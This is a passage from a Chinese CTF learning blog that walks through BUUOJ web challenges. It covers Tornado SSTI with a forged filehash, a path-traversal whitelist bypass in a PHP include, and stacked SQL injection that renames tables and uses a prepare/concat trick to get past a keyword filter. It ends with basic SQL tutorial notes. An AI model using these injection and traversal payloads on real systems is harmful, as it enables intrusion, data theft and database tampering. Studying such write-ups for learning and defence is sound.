<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'autoreload'</span>: <span class="keyword">True</span>, <span class="string">'compiled_template_cache'</span>: <span class="keyword">False</span>, <span class="string">'cookie_secret'</span>: <span class="string">'M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'</span>&#125;</span><br></pre></td></tr></table></figure>

<p>构造exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line"> md5 = hashlib.md5() </span><br><span class="line"> md5.update(s) </span><br><span class="line"> <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span><span class="params">()</span>:</span></span><br><span class="line"> filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line"> cookie_secret = <span class="string">'M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'</span></span><br><span class="line"> print(md5(cookie_secret+md5(filename)))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> filehash()</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://web9.buuoj.cn/<span class="keyword">file</span>?<span class="keyword">filename</span>=/fllllllllllllag&amp;filehash=<span class="number">70</span>aed71508e50d160a73756a21e9953d</span><br></pre></td></tr></table></figure>

<h4 id="learning-1"><a href="#learning-1" class="headerlink" title="learning"></a>learning</h4><p><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener">render函数介绍</a></p>
<p>（表示没太看懂）</p>
<p><a href="https://www.kancloud.cn/kancloud/python-basic/41712" target="_blank" rel="noopener">tornado模板self.render和模板变量传递</a></p>
<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">重点看两个类中都有的self.render()，用这个方法引入相应的模板。</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    self.render("index.html")</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">显示index.html模板，但是此时并没有向模板网页传递任何数据，仅仅显示罢了。下面一个：</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    self.render("user.html",username=user_name,email=user_email,website=user_website,language=user_language)</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">与前面的不同在于，不仅仅是要引用模板网页user.html，还要向这个网页传递一些数据，例如username=user_name，含义就是，在模板中，某个地方是用username来标示得到的数据，而user_name是此方法中的一个变量，也就是对应一个数据，那么模板中的username也就对应了user_name的数据，这是通过username=user_name完成的（说的有点像外语了）。后面的变量同理。</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">然后是index.html</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!DOCTYPE html&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">title</span>&gt;</span>sign in your name<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Information<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your name is </span><span class="template-variable">&#123;&#123;username&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your email is </span><span class="template-variable">&#123;&#123;email&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your website is </span><span class="template-variable">&#123;&#123;website&#125;&#125;</span><span class="xml">, it is very good. This website is make by </span><span class="template-variable">&#123;&#123;language&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">上面的模板代码存储为名为user.html的文件，并且和前面已经保存的在同一个目录中。</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">看HTML模板代码中，有类似</span><span class="template-variable">&#123;&#123;username&#125;&#125;</span><span class="xml">的变量，模板中用</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="xml">引入变量，这个变量就是在self.render()中规定的，两者变量名称一致，对应将相应的值对象引入到模板中。</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）</a></p>
<p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>

<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见：</p>
<p><a href="https://image.3001.net/images/20151104/14466168501989.png" target="_blank" rel="noopener"><img src="/2019/07/30/The_Third_Day_for_Web/14466168501989.png!small" alt="2.png"></a></p>
<p>对比上面两种情况，简单的说服务端模板注入的形成终究还是因为服务端相信了用户的输出而造成的（Web安全真谛：永远不要相信用户的输入！）。当然了，第二种情况下，攻击者不仅仅能插入 JavaScript 脚本，还能针对模板框架进行进一步的攻击，此部分只说明原理，在后面会对攻击利用进行详细说明和演示。</p>
<p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和<strong>解析</strong>最后输出。</p>
<p>借用本文第二部分所用到的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>

<p>在 Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 name=20 ，则在服务端拼接的模版内容为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Twig 模板引擎在编译模板的过程中会计算 20  中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出，如下图：</p>
<p><a href="https://image.3001.net/images/20151104/14466168807902.png" target="_blank" rel="noopener"><img src="/2019/07/30/The_Third_Day_for_Web/14466168807902.png!small" alt="3.png"></a></p>
<p><a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
<p><a href="https://blog.csdn.net/weixin_44677409/article/details/94410580" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/94410580</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2019/07/28/The_First_Day_for_Web/">
                The First Day for Web
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-07-28</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="The-First-Day-for-Web"><a href="#The-First-Day-for-Web" class="headerlink" title="The First Day for Web"></a>The First Day for Web</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>看是正式当一名web狗的第一天：先直接上<a href="https://buuoj.cn/challenges，面向题目学习。" target="_blank" rel="noopener">https://buuoj.cn/challenges，面向题目学习。</a></p>
<h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><p>基操后拿到源码和hint：flag not here, and flag in ffffllllaaaagggg</p>
<p>所以是简单的代码审计题目了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>先看下面，file要有值，然后是个字符串，然后进入check类</p>
<p>要求：</p>
<ol>
<li><p>如果$page在白名单，则成功，但显然flag不在白名单，所以过~</p>
</li>
<li><p>以‘?’分割$page，</p>
</li>
<li><p>第一部分内容要在白名单内，构造file=source.php?</p>
<p>然后就可以通过判断了，那就不管了，直接读flag</p>
</li>
</ol>
<p>构造payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web5.buuoj.cn<span class="regexp">/index.php?file=source.php?../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>这一题就属于今天要学习的内容了，所以是面向Wp解题（两种解题方法）</p>
<p>首先提交试试</p>
<p><img src="/2019/07/28/The_First_Day_for_Web/1564223770751.png" alt="1564223770751"></p>
<p>然后测试注入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://web<span class="number">16</span>.buuoj.cn/?inject=<span class="number">1</span>' <span class="keyword">or</span> '<span class="number">1</span>'='<span class="number">1</span></span><br><span class="line">http://web<span class="number">16</span>.buuoj.cn/?inject=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%20</span><span class="symbol">%271</span><span class="symbol">%27</span>=<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/The_First_Day_for_Web/1564223854147.png" alt="1564223854147"></p>
<p>然后随便试了试发现过滤</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//web16.buuoj.cn/?inject=1where</span></span><br></pre></td></tr></table></figure>

<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);</span></span><br></pre></td></tr></table></figure>

<p>然后师傅们很牛逼的就知道他是堆叠注入了（学）</p>
<p>列数据库</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+databases%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show databases;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/The_First_Day_for_Web/1564223974234.png" alt="1564223974234"></p>
<p>然后看表</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+tables%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show tables;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/The_First_Day_for_Web/1564224074931.png" alt="1564224074931"></p>
<p>再看这个数字表里的列</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+columns%<span class="number">20</span>from%<span class="number">20</span>`<span class="number">1919810931114514</span>`%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show columns from `<span class="number">1919810931114514</span>`;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/The_First_Day_for_Web/1564224134301.png" alt="1564224134301"></p>
<p>这个NO是不是代表不让读啊，反正师傅们都没去读它</p>
<p>顺便看看那个words表</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+columns%<span class="number">20</span>from%<span class="number">20</span>`words`%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show columns from `words`;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/The_First_Day_for_Web/1564224334629.png" alt="1564224334629"></p>
<p>这个复现环境里都是NO，可是原题是YES啊，那为啥flag不让直接读呢，（后来想想，大概是没这个语法2333）而是、、、</p>
<p>方法一：改名</p>
<p>9.他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。</p>
<p>先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。</p>
<p>这样就可以让程序直接查询出 flag 了。</p>
<p>构造 payload 如下，然后访问，看到这个看来就执行到最后一个语句了。（改表名那里直接从 pma 拷了一个语句过来改- -）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1%27;<span class="keyword">RENAME</span>%<span class="number">20</span><span class="keyword">TABLE</span>%<span class="number">20</span><span class="string">`words`</span>%<span class="number">20</span><span class="keyword">TO</span>%<span class="number">20</span><span class="string">`words1`</span>;<span class="keyword">RENAME</span>%<span class="number">20</span><span class="keyword">TABLE</span>%<span class="number">20</span><span class="string">`1919810931114514`</span>%<span class="number">20</span><span class="keyword">TO</span>%<span class="number">20</span><span class="string">`words`</span>;<span class="keyword">ALTER</span>%<span class="number">20</span><span class="keyword">TABLE</span>%<span class="number">20</span><span class="string">`words`</span>%<span class="number">20</span><span class="keyword">CHANGE</span>%<span class="number">20</span><span class="string">`flag`</span>%<span class="number">20</span><span class="string">`id`</span>%<span class="number">20</span><span class="built_in">VARCHAR</span>(<span class="number">100</span>)%<span class="number">20</span><span class="built_in">CHARACTER</span>%<span class="number">20</span><span class="keyword">SET</span>%<span class="number">20</span>utf8%<span class="number">20</span><span class="keyword">COLLATE</span>%<span class="number">20</span>utf8_general_ci%<span class="number">20</span><span class="keyword">NOT</span>%<span class="number">20</span><span class="literal">NULL</span>;<span class="keyword">show</span>%<span class="number">20</span><span class="keyword">columns</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>words;<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">/?inject=1';<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`words1`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web<span class="number">16</span>.buuoj.cn/?inject=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%20</span><span class="symbol">%271</span><span class="symbol">%27</span>=<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>由于过滤了 <strong>select</strong> 等关键字，我们可以用<strong>预编译</strong>来构造带有 <strong>select</strong> 的 <strong>sql</strong> 语句。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'sel'</span>,<span class="string">'ect * from `1919810931114514`'</span>);</span><br><span class="line"><span class="keyword">prepare</span> presql <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> presql;</span><br><span class="line"><span class="keyword">deallocate</span> <span class="keyword">prepare</span> presql</span><br></pre></td></tr></table></figure>

<p>提示</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strstr</span><span class="params">(<span class="variable">$inject</span>, <span class="string">"set"</span>)</span></span> &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>

<p>于是用大小写绕过</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">1</span>'%<span class="number">3</span>bSet+%<span class="number">40</span>sqll%<span class="number">3</span>dconcat('sel','ect+*+from+`<span class="number">1919810931114514</span>`')%<span class="number">3</span>bPrepare+presql+from+%<span class="number">40</span>sqll%<span class="number">3</span>bexecute+presql%<span class="number">3</span>bdeallocate+Prepare+presql%<span class="number">3</span>b%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>感觉这题在buuoj上复现的时候，之所以被那么多少人解出来， 很可能是因为数据库已经被前人改了，所以直接就可以梭出来了。</p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>由第二题引出今天的学习的内容，堆栈注入和预编译这两个小知识点。（还有SQL基础）</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>“Websites” 表的数据</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; set names utf8;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT <span class="symbol">*</span> FROM Websites;</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">5 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>解析</p>
<ul>
<li><strong>use RUNOOB;</strong> 命令用于选择数据库。</li>
<li><strong>set names utf8;</strong> 命令用于设置使用的字符集。</li>
<li><strong>SELECT * FROM Websites;</strong> 读取数据表的信息。</li>
<li>上面的表包含五条记录（每一条对应一个网站信息）和5个列（id、name、url、alexa 和country）。</li>
</ul>
<ul>
<li>SQL 对大小写不敏感：SELECT 与 select 是相同的。</li>
</ul>
<h4 id="SQL-语句后面的分号？"><a href="#SQL-语句后面的分号？" class="headerlink" title="SQL 语句后面的分号？"></a>SQL 语句后面的分号？</h4><p>某些数据库系统要求在每条 SQL 语句的末端使用分号。</p>
<p>分号是在数据库系统中分隔每条 SQL 语句的标准方法，这样就可以在对服务器的相同请求中执行一条以上的 SQL 语句。</p>
<p>在本教程中，我们将在每条 SQL 语句的末端使用分号。</p>
<h4 id="一些最重要的-SQL-命令"><a href="#一些最重要的-SQL-命令" class="headerlink" title="一些最重要的 SQL 命令"></a>一些最重要的 SQL 命令</h4><ul>
<li><strong>SELECT</strong> - 从数据库中提取数据</li>
<li><strong>UPDATE</strong> - 更新数据库中的数据</li>
<li><strong>DELETE</strong> - 从数据库中删除数据</li>
<li><strong>INSERT INTO</strong> - 向数据库中插入新数据</li>
<li><strong>CREATE DATABASE</strong> - 创建新数据库</li>
<li><strong>ALTER DATABASE</strong> - 修改数据库</li>
<li><strong>CREATE TABLE</strong> - 创建新表</li>
<li><strong>ALTER TABLE</strong> - 变更（改变）数据库表</li>
<li><strong>DROP TABLE</strong> - 删除表</li>
<li><strong>CREATE INDEX</strong> - 创建索引（搜索键）</li>
<li><strong>DROP INDEX</strong> - 删除索引</li>
</ul>
<h4 id="SQL-SELECT-语句"><a href="#SQL-SELECT-语句" class="headerlink" title="SQL SELECT 语句"></a>SQL SELECT 语句</h4><p>SQL SELECT 语法</p>
